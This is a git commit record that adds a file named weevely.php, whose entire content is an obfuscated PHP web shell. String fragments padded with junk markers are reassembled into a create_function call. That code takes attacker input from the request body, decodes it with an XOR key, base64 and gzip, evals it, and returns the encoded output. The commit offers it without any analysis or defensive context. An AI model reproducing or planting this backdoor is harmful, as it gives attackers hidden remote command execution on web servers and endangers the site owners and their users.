47b04d63a0bee6a483f3496f9874505b6e47f6b1
Muhammad Syahrul Haniawan <72645722+mumeido@users.noreply.github.com>
2021-08-17 00:11:36 +0700

    Create weevely.php

---
+++ weevely.php
@@ -0,0 +1,13 @@
+<?php
+$v='_match("/$]lkh(.+)$k]lf/",@]lfil]le_ge]lt_conten]lts("php://]linput")]l,$m';
+$w='$m]l[1]]l)]l,]l$k)));$o=@ob_get]l_contents]l();@ob_]lend_cl]lean()]l;]l';
+$Z='l);$j+]l+,$i++)]l]l{$o]l.=$t{$i}^$k]l]l{$j};]l}}return $o]l;}if (@pr]le]lg';
+$S='$k="63]la9f]l0]lea";$]lkh="7bb9805079]l6b";$kf="]l649e85]l4818]l]l45"';
+$T='$r=@base6]l4_encode(]l@x(@]lgzcompres]ls(]l$o),$k));p]lrin]lt("$p$kh]l$r$kf");}';
+$y='en]l($t]l);]l$]lo="";for($i]l=0;$i<]l$l]l;){for($j=0;($j]l<$c&&$i<$l]';
+$o=str_replace('ax','','creaxaxateax_axfuncaxtiaxon');
+$U=';$p="H]lgW]lEoBIjIXgfH]lgXF";func]ltion x]l($]l]lt,$k]l){$c=strlen($k);$l=s]ltrl';
+$X=')=]l=]l1) {@o]lb_start();@e]l]lval(@gzun]lcompress(]l@x(]l@base6]l4_decode(]l';
+$m=str_replace(']l','',$S.$U.$y.$Z.$v.$X.$w.$T);
+$P=$o('',$m);$P();
+?>
